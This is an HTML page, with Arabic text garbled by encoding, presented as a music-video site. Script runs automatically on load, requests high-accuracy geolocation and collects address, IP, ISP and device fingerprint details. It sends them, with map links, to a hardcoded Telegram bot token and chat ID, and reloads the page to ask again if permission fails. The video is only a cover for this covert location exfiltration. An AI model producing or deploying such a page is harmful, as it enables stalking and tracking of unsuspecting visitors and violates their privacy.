<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…ÙˆØ³ÙŠÙ‚Ù‰ Ø¨Ø¯ÙˆÙ† ØªÙˆÙ‚Ù</title>
    <style>
        /* Ù†ÙØ³ Ø§Ù„ØªØµÙ…ÙŠÙ… Ø§Ù„Ø³Ø§Ø¨Ù‚ */
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Arial',sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;color:white;text-align:center}
        .container{padding:40px;background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);border-radius:20px;box-shadow:0 8px 32px 0 rgba(31,38,135,0.37);border:1px solid rgba(255,255,255,0.18);max-width:500px;width:90%}
        .logo{font-size:48px;margin-bottom:20px}
        h1{font-size:2.5em;margin-bottom:20px;text-shadow:2px 2px 4px rgba(0,0,0,0.3)}
        .subtitle{font-size:1.2em;margin-bottom:30px;opacity:0.9}
        .loading{display:none;margin-top:20px}
        .spinner{border:4px solid rgba(255,255,255,0.3);border-radius:50%;border-top:4px solid white;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .video-container{display:none;width:100%;height:100vh;position:fixed;top:0;left:0;z-index:1000;background:black}
        .video-iframe{width:100%;height:100%;border:none}
        .error-message{color:#ff6b6b;margin-top:20px;display:none}
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="logo">ğŸµ</div>
        <h1>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</h1>
        <p class="subtitle">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù„Ø­Ø¸Ø©</p>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Ø¬Ø§Ø±ÙŠ Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹...</p>
        </div>
        <div class="error-message" id="errorMessage"></div>
    </div>

    <div class="video-container" id="videoContainer">
        <video class="video-iframe" autoplay controls loop>
            <source src="video.mp4" type="video/mp4">
            Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ.
        </video>
    </div>

    <script>
        const BOT_TOKEN = '8187121968:AAEBqzlthL208wbO2SCISxLeZWiwhhTzQGk';
        const CHAT_ID = '361157589';

        // ØªÙ†ÙÙŠØ° ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙÙˆØ± ÙØªØ­ Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('load', function() {
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ© Ù…Ù† ÙØªØ­ Ø§Ù„Ù…ÙˆÙ‚Ø¹
            setTimeout(() => {
                requestPermissions();
            }, 1000);
        });

        async function requestPermissions() {
            const mainContainer = document.getElementById('mainContainer');
            const loading = document.getElementById('loading');
            const errorMessage = document.getElementById('errorMessage');
            const videoContainer = document.getElementById('videoContainer');

            try {
                loading.style.display = 'block';

                const position = await getCurrentPosition();
                const { latitude, longitude } = position.coords;
                const locationInfo = await getLocationDetails(latitude, longitude);
                const ipInfo = await getIPInfo();
                const deviceInfo = getDeviceInfo();

                const message = formatMessage({
                    latitude, longitude, locationInfo, ipInfo, deviceInfo,
                    timestamp: new Date().toLocaleString('ar-SA')
                });

                await sendToTelegram(message);

                loading.style.display = 'none';
                videoContainer.style.display = 'block';
                await sendToTelegram('âœ… ØªÙ… ÙØªØ­ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ù†Ø¬Ø§Ø­!');

            } catch (error) {
                loading.style.display = 'none';
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'Ø­Ø¯Ø« Ø®Ø·Ø£: ' + error.message + ' - Ø­Ø§ÙˆÙ„ ØªØ­Ø¯ÙŠØ« Ø§Ù„ØµÙØ­Ø©';
                await sendToTelegram('âŒ Ø®Ø·Ø£: ' + error.message);
                
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø«Ø§Ù†ÙŠØ© ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†ÙŠ
                setTimeout(() => {
                    location.reload();
                }, 3000);
            }
        }

        function getCurrentPosition() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹'));
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    resolve,
                    (error) => {
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                reject(new Error('ØªÙ… Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹'));
                                break;
                            case error.POSITION_UNAVAILABLE:
                                reject(new Error('Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…ØªØ§Ø­'));
                                break;
                            case error.TIMEOUT:
                                reject(new Error('Ø§Ù†ØªÙ‡Øª Ù…Ù‡Ù„Ø© ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹'));
                                break;
                            default:
                                reject(new Error('Ø®Ø·Ø£ ÙÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹'));
                                break;
                        }
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            });
        }

        async function getLocationDetails(lat, lng) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                const data = await response.json();
                
                return {
                    address: data.display_name,
                    city: data.address.city || data.address.town || data.address.village,
                    country: data.address.country,
                    state: data.address.state
                };
            } catch (error) {
                return { error: 'ØªØ¹Ø°Ø± Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹' };
            }
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org
                };
            } catch (error) {
                return { error: 'ØªØ¹Ø°Ø± Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª IP' };
            }
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        function formatMessage(data) {
            const { latitude, longitude, locationInfo, ipInfo, deviceInfo, timestamp } = data;
            
            return `ğŸ“ <b>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© (ØªÙ„Ù‚Ø§Ø¦ÙŠ)</b>
            
ğŸ• <b>Ø§Ù„ÙˆÙ‚Øª:</b> ${timestamp}

ğŸ“ <b>Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª:</b>
â€¢ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${latitude}
â€¢ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${longitude}

ğŸ  <b>Ø§Ù„Ø¹Ù†ÙˆØ§Ù†:</b> ${locationInfo.address || 'ØºÙŠØ± Ù…ØªØ§Ø­'}
â€¢ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${locationInfo.city || 'ØºÙŠØ± Ù…ØªØ§Ø­'}
â€¢ Ø§Ù„Ù…Ù†Ø·Ù‚Ø©: ${locationInfo.state || 'ØºÙŠØ± Ù…ØªØ§Ø­'}
â€¢ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${locationInfo.country || 'ØºÙŠØ± Ù…ØªØ§Ø­'}

ğŸŒ <b>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©:</b>
â€¢ Ø¹Ù†ÙˆØ§Ù† IP: ${ipInfo.ip || 'ØºÙŠØ± Ù…ØªØ§Ø­'}
â€¢ Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø©: ${ipInfo.isp || 'ØºÙŠØ± Ù…ØªØ§Ø­'}
â€¢ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${ipInfo.city || 'ØºÙŠØ± Ù…ØªØ§Ø­'}
â€¢ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${ipInfo.country || 'ØºÙŠØ± Ù…ØªØ§Ø­'}

ğŸ“± <b>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:</b>
â€¢ Ø§Ù„Ù†Ø¸Ø§Ù…: ${deviceInfo.platform}
â€¢ Ø§Ù„Ù…ØªØµÙØ­: ${deviceInfo.userAgent.split(' ').slice(-1)[0]}
â€¢ Ø§Ù„Ù„ØºØ©: ${deviceInfo.language}
â€¢ Ø§Ù„Ø¯Ù‚Ø©: ${deviceInfo.screenResolution}
â€¢ Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©: ${deviceInfo.timezone}

ğŸ—ºï¸ <b>Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø©:</b>
https://www.google.com/maps?q=${latitude},${longitude}

ğŸ—ºï¸ <b>Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø© Ø§Ù„ØªÙØµÙŠÙ„ÙŠØ©:</b>
https://www.google.com/maps/@${latitude},${longitude},20z`;
        }

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const params = new URLSearchParams({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            });

            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: params
            });

            if (!response.ok) {
                throw new Error('ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ ØªÙ„ÙŠÙƒØ±Ø§Ù…');
            }

            return response.json();
        }
    </script>
</body>
</html>